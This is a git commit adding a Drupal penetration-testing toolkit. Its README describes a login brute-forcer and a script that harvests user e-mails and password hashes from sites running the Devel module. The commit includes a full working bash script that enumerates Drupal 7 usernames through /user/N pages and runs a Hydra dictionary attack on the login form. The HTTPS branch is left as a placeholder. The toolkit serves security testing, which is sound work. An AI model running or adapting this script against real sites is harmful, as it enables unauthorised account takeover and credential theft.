53bfc26717f805c9747337bf2714a52adf66f54c
gfoss <greg.foss@owasp.org>
2014-01-15 13:18:37 -0700

    Initial Commit

--- README.md
+++ README.md
@@ -1,6 +1,41 @@
-attacking-drupal
-================
+#Attacking Drupal
+greg.foss [at] LogRhythm.com
 
-Scripts used to automate the penetration testing process of Drupal web applications.
+v0.1 Beta -- 1/15/2014
 
---COMING SOON--
+Scripts and a basic checklist used to augment the penetration testing and security process of Drupal web applications. These scripts and the drupal-security-checklist.pdf coincide with the 'Attacking Drupal' presentation, which covers many common configuration flaws associated with Drupal web applications.
+
+     Presentation: <link coming soon>
+     
+--------------------------------------------------
+
+#[account-forcer]
+A Drupal account brute-forceing script.
+
+There are two versions, Drupal 6 and Drupal 7 as each has slight differences in the code. This script will work with any wordlist against a Drupal 6 application, assuming that it does not have additional protections in place such as rate limiting, MFA, SSO, CAPTCHA (implemented properly) etc. Drupal 7 is a bit trickier, and will only work if a small wordlist is used.
+
+     To run...
+          Drupal 6     ./d6-account-forcer.sh (then follow the prompts)
+          Drupal 7     ./d7-account-forcer.sh (then follow the prompts)
+     
+--------------------------------------------------
+
+#[devel-exploit]
+This script will harvest all user e-mails and password hashes from an application running the Drupal Devel module.
+
+There are two versions, Drupal 6 and Drupal 7 as each has slight differences in the code. This script can be used to automate the task of extracting user account information from any site that has left the devel module enabled.
+
+     To run...
+          Drupal 6     ./d6-devel-exploit.sh (then follow the prompts)
+          Drupal 7     ./d7-devel-exploit.sh (then follow the prompts)
+     
+--------------------------------------------------
+
+#[drupal-security-checklist]
+Basic checklist which helps developers and security teams alike avoid common security pitfalls when developing Drupal web applications.
+
+--------------------------------------------------
+
+#[changelog]
+     1/15/2014 - Public Release
+--------------------------------------------------
---
+++ scripts/d7-account-forcer.sh
@@ -0,0 +1,117 @@
+#!/bin/bash
+
+# Drupal 7 - Account Forcer
+# greg.foss[at]owasp.org
+#
+# ONLY USE THIS SCRIPT LEGALLY, AGAINST AUTHORIZED TARGETS
+# THE DEVELOPER OF THIS SCRIPT IS NOT LIABLE FOR ILLEGAL/QUESTIONABLE ACTIVITIES CONDUCTED WITH THIS TOOL
+# BY RUNNING THIS SCRIPT, YOU AGREE THAT YOU HAVE READ AND UNDERSTAND THESE TERMS
+
+#display banner and define variables
+echo "  ___                      _   ____             "
+echo " |   \ _ _ _  _ _ __  __ _| | |__  |            "
+echo " | |) | '_| || | '_ \/ _\` | |   / /             "
+echo " |___/|_|  \_,_| .__/\__,_|_|  /_/              "
+echo "               |_|                              "
+echo "                         Drupal 7 Account Forcer"
+echo "                         greg.foss[at]owasp.org "
+echo ""
+echo -e "[-] Define the target application: [www.site.com]"
+read site
+out=$(echo $site | cut -d "/" -f 1)
+sub=$(echo $site | cut -d "/" -f 2)
+slash=$(echo $sub | wc -l)
+if [ $slash = "1" ]; then
+	s="/"
+else
+	s=""
+fi
+pre=$(echo $s$sub)
+echo -e "[-] Enter your session id: [session=id]"
+read session
+echo -e "[-] Protocol: [http] / [https]"
+read proto
+if [ $proto = "http" ]; then
+	protocol="http"
+else
+	protocol="-k https"
+fi
+echo -e "[-] Is the application using clean URL's? [y/n]"
+read clean
+echo -e "[-] How many accounts do you want to attack?"
+read accounts
+echo -e "[-] Provide the wordlist you would like to use:"
+read file
+if [ -e $file ]; then
+	echo "     [*]"$file" exists"
+else
+	echo "     [-]"$file" does not exist..."
+	echo ""
+	exit 2
+fi
+
+#um... yeah...
+echo ""
+echo "extracting usernames..."
+echo ""
+
+#create local directory and curl data from the site
+mkdir export
+if [ $clean = "n" ]; then
+	for i in $(seq 1 $accounts);
+	do
+		curl -s -b $session $protocol://$site/?q=user/$i > export/$i.txt
+	done
+else
+	for i in $(seq 1 $accounts);
+	do
+		curl -s -b $session $protocol://$site/user/$i > export/$i.txt
+	done
+fi
+
+#pull important info, make it pretty and store data
+cat export/* | grep "<title>" | cut -d "-" -f 3 | sed 's/........$//' | cut -d ">" -f 2 | cut -d "|" -f 1 | grep -i -v "page not found\|access denied" >> usernames.txt
+cat usernames.txt | sort | uniq > $out"_usernames_"`date '+%m%d%Y'`".txt"
+count=$(cat usernames.txt | wc -l);
+
+#display + count usernames
+if [ $count = "0" ]; then
+	echo "No usernames recovered..."
+	echo "Ensure that you have entered a valid Session ID and try again"
+	rm usernames.txt
+	rm -rf export
+	echo ""
+	exit 2
+else
+	echo $count" => targets identified"
+	echo "----------------------------------------"
+	cat $out"_usernames_"`date '+%m%d%Y'`".txt"
+	echo "----------------------------------------"
+	echo "accounts saved to => "$out"_usernames_"`date '+%m%d%Y'`".txt"
+	echo ""
+fi
+
+#run a dictionary attack against user accounts
+id=$(curl -s $protocol://$site/user/ | grep "form_build_id" | cut -d "\"" -f 6)
+echo "attempting to access "$accounts" accounts using the wordlist ("$file")"
+echo $(cat $file| wc -l )" logon attempts will be made against each account"
+
+#run hydra against each account and display results
+echo ""
+echo "launching Hydra..."
+echo "----------------------------------------"
+if [ $protocol = "http" ]; then
+	/usr/bin/hydra -L usernames.txt -P $file $out http-form-post $pre"/user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry"
+#hydra -l admin -P words/words.txt localhost http-post-form "/node?destination=node:name=^USER^&pass=^PASS^&form_id=user_login_block&form_build_id=form-4f81eea9f5f4743e490ba666f0c32384:Sorry"
+else
+	echo "blah"
+	#/usr/bin/hydra -L usernames.txt -P $file $out https-form-post $pre"/user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry"
+fi
+echo "----------------------------------------"
+echo ""
+echo "party on..."
+echo ""
+
+#clean up
+rm usernames.txt
+rm -rf export
